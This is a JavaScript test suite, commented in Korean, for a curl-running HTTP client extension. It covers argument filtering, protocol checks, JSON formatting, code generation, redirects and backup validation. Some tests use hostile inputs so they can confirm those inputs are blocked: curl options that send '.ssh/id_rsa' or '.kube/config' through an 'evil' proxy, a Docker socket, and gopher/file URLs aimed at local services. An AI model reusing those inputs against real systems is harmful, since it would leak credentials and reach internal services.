// Ssoda 0단계 수정 회귀 테스트 (확장의 실제 모듈을 import)
// 실행: 저장소 최상위에서 npm test (또는 node --test tests/)
import { test } from 'node:test';
import assert from 'node:assert/strict';

const JS = new URL('../../ssoda/js/', import.meta.url);
const mod = (f) => import(new URL(f, JS).href);
const { parseCurl } = await mod('curl-parser.js');
const { parseExtraArgs, describeRemovedArgs, buildCurlExec, CurlRunError } = await mod('curl-runner.js');
const { formatJson, hasLossyNumbers, isLossyNumber } = await mod('json-format.js');
const { generateCode } = await mod('codegen.js');
const { buildDnrRules, redirectStep, hopHeaders, MAX_REDIRECTS } = await mod('http.js');
const { sanitizeBackupData, curlSettingsSummary } = await mod('backup-check.js');
const { prepareRequest } = await mod('prepare.js');
const { DEFAULT_SETTINGS, migrateSettings } = await mod('store.js');

/* ---------------- curl 허용 목록 ---------------- */
test('추가 인자: @파일 값은 제외(file)', () => {
  const r = parseExtraArgs('--proxy http://evil:8080 --proxy-header @.kube/config --proxy-user @u:p');
  assert.deepEqual(r.args, ['--proxy', 'http://evil:8080']);
  assert.deepEqual(r.removed.map((x) => x.reason), ['file', 'file']);
  assert.match(describeRemovedArgs(r.removed).join('\n'), /@파일/);
});

test('추가 인자: --proxy-header=@파일 형식도 제외', () => {
  const r = parseExtraArgs('--proxy-header=@secret.txt --cacert=@x');
  assert.deepEqual(r.args, []);
  assert.equal(r.removed.length, 2);
});

test('추가 인자: --unix-socket / --abstract-unix-socket 은 허용하지 않음', () => {
  const r = parseExtraArgs('--unix-socket /var/run/docker.sock --abstract-unix-socket x');
  assert.deepEqual(r.args, []);
  assert.deepEqual(r.removed.map((x) => x.reason), ['unsafe', 'unsafe']);
});

test('추가 인자: 기존 허용 옵션은 그대로 통과', () => {
  const r = parseExtraArgs("--proxy http://127.0.0.1:8888 -U me:pw --proxy-ntlm --resolve a.com:443:1.2.3.4 --cacert 'C:\\ca.pem' --ntlm --retry 2 -k");
  assert.deepEqual(r.removed, []);
  assert.deepEqual(r.args, ['--proxy', 'http://127.0.0.1:8888', '--proxy-user', 'me:pw', '--proxy-ntlm', '--resolve', 'a.com:443:1.2.3.4', '--cacert', 'C:\\ca.pem', '--ntlm', '--retry', '2', '--insecure']);
});

test('cURL 붙여넣기: @파일 값과 로컬 소켓 옵션은 경고와 함께 빠짐', () => {
  const { request, warnings } = parseCurl("curl --proxy http://evil:3128 --proxy-header @.ssh/id_rsa --unix-socket /var/run/docker.sock --resolve a:1:2 https://api.example.com/x");
  assert.equal(request.settings.curl.extra, '--proxy http://evil:3128 --resolve a:1:2');
  assert.ok(warnings.some((w) => /@파일/.test(w) && /proxy-header/.test(w)), warnings.join('\n'));
  assert.ok(warnings.some((w) => /unix-socket/.test(w) && /로컬 소켓/.test(w)), warnings.join('\n'));
});

const P = (over = {}) => ({ method: 'GET', url: 'https://api.example.com/a', headers: [], body: { mode: 'none' }, settings: { followRedirects: true, timeout: 0 }, ...over });

test('curl 실행: http/https 외 프로토콜 거부', () => {
  for (const url of ['file:///C:/Windows/win.ini', 'gopher://127.0.0.1:6379/_FLUSHALL', 'dict://127.0.0.1:11211/', 'ftp://example.com/', 'ldap://x/']) {
    assert.throws(() => buildCurlExec(P({ url })), (e) => e instanceof CurlRunError && e.code === 'INVALID_URL' && /지원하지 않는 프로토콜/.test(e.message), url);
  }
  assert.throws(() => buildCurlExec(P({ url: 'not a url' })), (e) => e.code === 'INVALID_URL' && /형식/.test(e.message));
});

test('curl 실행: --proto/--proto-redir 고정, URL 은 마지막 --url', () => {
  const ex = buildCurlExec(P({ url: 'http://한글.example.com/경로?q=값' }));
  assert.deepEqual(ex.argv.slice(0, 5), ['-sS', '--proto', '=http,https', '--proto-redir', '=http,https']);
  assert.equal(ex.argv[ex.argv.length - 2], '--url');
  assert.match(ex.url, /^http:\/\/xn--/);
  assert.match(ex.url, /%EA%B2%BD/);
});

test('curl 실행: 헤더 이름 검사 (@ 로 시작하면 -H @파일 이 되므로 거부)', () => {
  assert.throws(() => buildCurlExec(P({ headers: [{ key: '@.kube/config', value: 'x' }] })), (e) => e.code === 'INVALID_HEADER');
  assert.throws(() => buildCurlExec(P({ headers: [{ key: '@secret', value: '' }] })), (e) => e.code === 'INVALID_HEADER');
  assert.throws(() => buildCurlExec(P({ headers: [{ key: 'Bad Name', value: 'x' }] })), (e) => e.code === 'INVALID_HEADER');
  const ok = buildCurlExec(P({ headers: [{ key: 'X-Api-Key', value: 'a b' }, { key: 'X-Empty', value: '' }] }));
  assert.ok(ok.argv.includes('X-Api-Key: a b'));
  assert.ok(ok.argv.includes('X-Empty;'));
});

test('curl 실행: API Key 인증의 헤더 이름도 검사', () => {
  const draft = { method: 'GET', url: 'https://x.test/', headers: [], params: [], cookies: [], auth: { type: 'apikey', apikey: { key: '@C:/Users/me/.ssh/id_rsa', value: 'v', in: 'header' } }, body: { mode: 'none' }, settings: {} };
  const p = prepareRequest(draft, { forCurl: true });
  assert.throws(() => buildCurlExec(p), (e) => e.code === 'INVALID_HEADER');
});

/* ---------------- 무손실 JSON 정렬 ---------------- */
const SAMPLES = [
  '{"a":1,"b":[1,2,{"c":null,"d":true}],"e":{},"f":[],"g":"x"}',
  '[]', '{}', '"str"', '123', 'null', '[{}, [], [[]], {"a": {}}]',
  ' { "nested" : { "deep" : [ 1 , 2.5 , -300 , "a\\"b" , "\\\\" ] } } ',
  '{"unicode":"한글 😀","esc":"\\n\\t\\r"}',
];
test('formatJson: 정밀도 문제 없는 JSON 은 JSON.stringify(…, null, 2) 와 같은 결과', () => {
  for (const s of SAMPLES) assert.equal(formatJson(s), JSON.stringify(JSON.parse(s), null, 2), s);
});

test('formatJson: 큰 정수·소수 자릿수·이스케이프를 원문 그대로 유지', () => {
  assert.equal(formatJson('[-3e2,1E+5]'), '[\n  -3e2,\n  1E+5\n]');
  const src = '{"id":1234567890123456789,"neg":-9007199254740993,"p":0.10000000000000000555,"one":1.0,"e":1E400,"s":"\\u003cb\\u003e\\/"}';
  const out = formatJson(src);
  for (const tok of ['1234567890123456789', '-9007199254740993', '0.10000000000000000555', '1.0', '1E400', '"\\u003cb\\u003e\\/"']) assert.ok(out.includes(tok), tok);
  assert.equal(out.replace(/\s+/g, ''), src); // 공백만 바뀜
  // 예전 방식은 값을 바꿨다
  assert.ok(!JSON.stringify(JSON.parse(src)).includes('1234567890123456789'));
});

test('formatJson: 잘못된 JSON 은 예외', () => {
  for (const s of ['{a:1}', '{"a":1,}', '[1,2', '', "{'a':1}"]) assert.throws(() => formatJson(s), SyntaxError, s);
});

test('formatJson: 큰 응답도 빠르게 (약 5MB)', () => {
  const big = JSON.stringify(Array.from({ length: 40000 }, (_, i) => ({ id: '1234567890123456' + i, n: i, s: 'x'.repeat(60), arr: [i, i + 1, { k: null }] })));
  const t = performance.now();
  const out = formatJson(big);
  const ms = performance.now() - t;
  assert.equal(out, JSON.stringify(JSON.parse(big), null, 2));
  assert.ok(ms < 3000, `${ms} ms`);
});

test('hasLossyNumbers / isLossyNumber', () => {
  assert.equal(hasLossyNumbers('{"id":1234567890123456789}'), true);
  assert.equal(hasLossyNumbers('[9007199254740993]'), true);
  assert.equal(hasLossyNumbers('{"p":0.10000000000000000555}'), true);
  assert.equal(hasLossyNumbers('{"big":1e400}'), true);
  assert.equal(hasLossyNumbers('{"a":9007199254740991,"b":1.5,"c":-0,"d":1e21,"e":100000000000000000000,"f":1.0,"g":0.1,"h":2.50}'), false);
  assert.equal(hasLossyNumbers('{"s":"1234567890123456789"}'), false); // 문자열 안은 무시
  assert.equal(isLossyNumber('12345678901234567890'), true);
  assert.equal(isLossyNumber('123.456'), false);
});

/* ---------------- 코드 생성 ---------------- */
const jsonReq = (text) => ({ method: 'POST', url: 'https://api.example.com/o', headers: [{ key: 'Content-Type', value: 'application/json' }], body: { mode: 'raw', text }, settings: {} });
test('코드 생성: 큰 정수가 있으면 원문 문자열로 (fetch/axios/python)', () => {
  const text = '{"orderId":1234567890123456789,"qty":2}';
  const fetch = generateCode('fetch', jsonReq(text));
  const axios = generateCode('axios', jsonReq(text));
  const py = generateCode('python', jsonReq(text));
  for (const code of [fetch, axios, py]) {
    assert.ok(code.includes('1234567890123456789'), code);
    assert.ok(!code.includes('1234567890123456800'), code);
  }
  assert.ok(!py.includes('import json'));
});

test('코드 생성: 평범한 JSON 은 예전처럼 객체 리터럴', () => {
  const fetch = generateCode('fetch', jsonReq('{"a":1,"b":"x"}'));
  assert.match(fetch, /const raw = JSON\.stringify\(\{/);
  const py = generateCode('python', jsonReq('{"a":1}'));
  assert.match(py, /import json/);
  assert.match(py, /json\.dumps\(/);
});

/* ---------------- 리다이렉트 헤더 규칙 ---------------- */
test('DNR 규칙: 이 주소에만 건다 (서버 리다이렉트는 단계마다 새로), http 는 Chrome 의 https 전환(HSTS)용 규칙 하나 더', () => {
  const hdrs = [{ header: 'user-agent', operation: 'set', value: 'UA/1' }, { header: 'cookie', operation: 'set', value: 'a=1' }, { header: 'origin', operation: 'remove' }];
  const rules = buildDnrRules('http://api.example.com/v1/x?q=1', hdrs, { tabId: 7, extId: 'ext' });
  assert.deepEqual(rules.map((r) => [r.priority, r.condition.urlFilter]), [[2, '|http://api.example.com/v1/x?q=1|'], [1, '|https://api.example.com/']]);
  for (const r of rules) {
    assert.deepEqual(r.action.requestHeaders, hdrs); // 같은 요청이므로 Cookie 도
    assert.deepEqual(r.condition.tabIds, [7]);
    assert.deepEqual(r.condition.initiatorDomains, ['ext']);
    assert.deepEqual(r.condition.resourceTypes, ['xmlhttprequest']);
  }
  assert.equal(buildDnrRules('https://h.test:8443/a', hdrs, {}).length, 1);
  // urlFilter 특수 문자(* ^ |)가 든 주소는 정확히 고를 수 없어 같은 서버 전체 (같은 서버 요청은 하나씩 보내므로 안전)
  assert.equal(buildDnrRules('https://h.test:8443/a?q=a|b*', hdrs, {})[0].condition.urlFilter, '|https://h.test:8443/');
  assert.deepEqual(buildDnrRules('http://h.test/', [], {}), []);
});

test('리다이렉트 단계: 메서드·본문은 Fetch 표준, 인증 정보는 다른 출처로 보내지 않음', () => {
  const o = 'http://a.test:8080';
  const step = (status, method, to) => redirectStep({ status, method, to, origin: o });
  assert.deepEqual(step(302, 'POST', 'http://a.test:8080/x'), { method: 'GET', dropBody: true, crossOrigin: false });
  assert.deepEqual(step(301, 'POST', 'http://a.test:8080/x'), { method: 'GET', dropBody: true, crossOrigin: false });
  assert.deepEqual(step(302, 'PUT', 'http://a.test:8080/x'), { method: 'PUT', dropBody: false, crossOrigin: false });
  assert.deepEqual(step(303, 'PUT', 'http://b.test/x'), { method: 'GET', dropBody: true, crossOrigin: true });
  assert.deepEqual(step(303, 'HEAD', 'http://a.test:8080/'), { method: 'HEAD', dropBody: false, crossOrigin: false });
  assert.deepEqual(step(307, 'POST', 'https://a.test:8080/x'), { method: 'POST', dropBody: false, crossOrigin: true }); // 스킴이 바뀌어도 다른 출처
  assert.equal(step(308, 'POST', 'http://a.test:9090/').crossOrigin, true); // 포트가 바뀌어도

  const pairs = [['Authorization', 'Bearer t'], ['Content-Type', 'application/json'], ['X-Trace', '1']];
  const dnr = [{ header: 'cookie', operation: 'set', value: 'a=1' }, { header: 'user-agent', operation: 'set', value: 'UA' }, { header: 'origin', operation: 'remove' }];
  const same = hopHeaders(pairs, dnr, {});
  assert.equal(same.pairs.length, 3);
  assert.equal(same.dnr.length, 3);
  const cross = hopHeaders(pairs, dnr, { crossOrigin: true });
  assert.deepEqual(cross.pairs.map(([k]) => k), ['Content-Type', 'X-Trace']);
  assert.deepEqual(cross.dnr.map((x) => x.header), ['user-agent', 'origin']);
  const toGet = hopHeaders(pairs, dnr, { bodyDropped: true });
  assert.deepEqual(toGet.pairs.map(([k]) => k), ['Authorization', 'X-Trace']);
  assert.equal(MAX_REDIRECTS, 20);
});

/* ---------------- 기본 타임아웃 60초 ---------------- */
test('설정 형식 2판: 예전 설정의 타임아웃 0(무제한)은 한 번 60초로, 직접 넣은 값은 그대로', () => {
  assert.equal(DEFAULT_SETTINGS.timeout, 60000);
  const old = migrateSettings({ theme: 'dark', timeout: 0, historyLimit: 50 });
  assert.equal(old.settings.timeout, 60000);
  assert.deepEqual(old.notes, ['timeout']);
  assert.equal(old.changed, true);
  assert.equal(old.settings.settingsRev, 2);
  assert.equal(old.settings.theme, 'dark');
  assert.equal(old.settings.historyLimit, 50);
  const kept = migrateSettings({ timeout: 30000 });
  assert.equal(kept.settings.timeout, 30000);
  assert.deepEqual(kept.notes, []);
  assert.equal(kept.changed, true); // 판 번호만 올려 저장
  // 2판에서 0 을 고른 사용자는 그대로 무제한
  const now = migrateSettings({ timeout: 0, settingsRev: 2 });
  assert.equal(now.settings.timeout, 0);
  assert.deepEqual(now.notes, []);
  assert.equal(now.changed, false);
  // 저장된 설정이 없으면(새로 설치) 기본값
  assert.equal(migrateSettings(undefined).settings.timeout, 60000);
  assert.equal(migrateSettings([]).settings.timeout, 60000);
});

test('기본 타임아웃은 보낼 때만 쓰고, 복사·코드 생성에는 요청에 직접 넣은 값만 적음', () => {
  const draft = (timeout) => ({ method: 'GET', url: 'https://api.example.com/a', headers: [], params: [], cookies: [], body: { mode: 'none' }, auth: { type: 'none' }, settings: { timeout } });
  const viaDefault = prepareRequest(draft(null), { defaults: { timeout: 60000 } });
  assert.equal(viaDefault.settings.timeout, 60000);
  assert.equal(viaDefault.settings.timeoutIsDefault, true);
  const ex = buildCurlExec(viaDefault, {});
  assert.deepEqual(ex.argv.slice(ex.argv.indexOf('--max-time'), ex.argv.indexOf('--max-time') + 2), ['--max-time', '60']);
  for (const lang of ['curl', 'curl-cmd', 'fetch', 'axios', 'python', 'httpie', 'powershell', 'go']) {
    assert.doesNotMatch(generateCode(lang, viaDefault), /max-time|timeout|Timeout/, lang);
  }
  assert.match(generateCode('curl', viaDefault, { exact: true }), /--max-time 60/); // 실제로 실행한 명령(Terminal)
  const own = prepareRequest(draft(5000), { defaults: { timeout: 60000 } });
  assert.equal(own.settings.timeoutIsDefault, undefined);
  assert.match(generateCode('curl', own), /--max-time 5/);
  assert.match(generateCode('python', own), /timeout=5/);
  const none = prepareRequest(draft(0), { defaults: { timeout: 60000 } });
  assert.equal(none.settings.timeout, 0);
  assert.doesNotMatch(generateCode('curl', none, { exact: true }), /max-time/);
});

/* ---------------- 백업 복원 검사 ---------------- */
test('백업 검사: 형식이 틀리면 예외', () => {
  assert.throws(() => sanitizeBackupData(null), /data/);
  assert.throws(() => sanitizeBackupData({ collections: {} }), /collections/);
  assert.throws(() => sanitizeBackupData({ history: 'x' }), /history/);
  assert.throws(() => sanitizeBackupData({ settings: [] }), /settings/);
});

test('백업 검사: 깨진 항목 정리 + workspace 는 복원하지 않음', () => {
  const d = sanitizeBackupData({
    collections: [{ name: 'C', items: [null, 3, { type: 'folder', name: 'F', items: [{ type: 'request', name: 'R' }] }, { name: 'R2', request: { url: 'http://x' } }] }, 'bad'],
    environments: [{ name: 'E', ssh: { enabled: 1, host: ' h ', port: '99999', user: 'u', password: 'pw' } }],
    history: [{ request: null }],
    workspace: { tabs: [{ draft: {} }] },
  });
  assert.equal(d.collections.length, 1);
  const c = d.collections[0];
  assert.ok(c.id && Array.isArray(c.variables));
  assert.equal(c.items.length, 2);
  assert.equal(c.items[0].items[0].request.method, 'GET');
  assert.equal(c.items[1].request.url, 'http://x');
  assert.deepEqual(d.environments[0].ssh, { enabled: true, host: 'h', port: 65535, user: 'u', legacy: false });
  assert.equal(d.history[0].request.method, 'GET');
  assert.equal('workspace' in d, false);
});

test('백업 검사: cURL 실행 설정 요약', () => {
  const d = sanitizeBackupData({
    collections: [{ name: '운영', items: [
      { type: 'folder', name: '주문', items: [{ type: 'request', name: '조회', request: { url: 'https://a', settings: { curl: { extra: '--proxy http://evil:8080 --proxy-header @x', insecure: true } } } }] },
      { type: 'request', name: '평범', request: { url: 'https://b' } },
    ] }],
    history: [{ name: '', request: { method: 'POST', url: 'https://c', settings: { curl: { extra: '--resolve c:443:6.6.6.6' } } } }],
    environments: [{ name: '운영1', ssh: { enabled: true, host: '10.0.0.1', user: 'app', port: 22 } }, { name: '개발', ssh: { enabled: false, host: 'x' } }],
  });
  const s = curlSettingsSummary(d);
  assert.equal(s.requests.length, 2);
  assert.equal(s.requests[0].where, '운영 / 주문 / 조회');
  assert.deepEqual(s.requests[0].notes, ['--proxy http://evil:8080', '-k (SSL 인증서 검사 끔)']);
  assert.match(s.requests[1].where, /^히스토리 \/ POST https:\/\/c/);
  assert.deepEqual(s.ssh, [{ name: '운영1', server: 'app@10.0.0.1:22' }]);
});
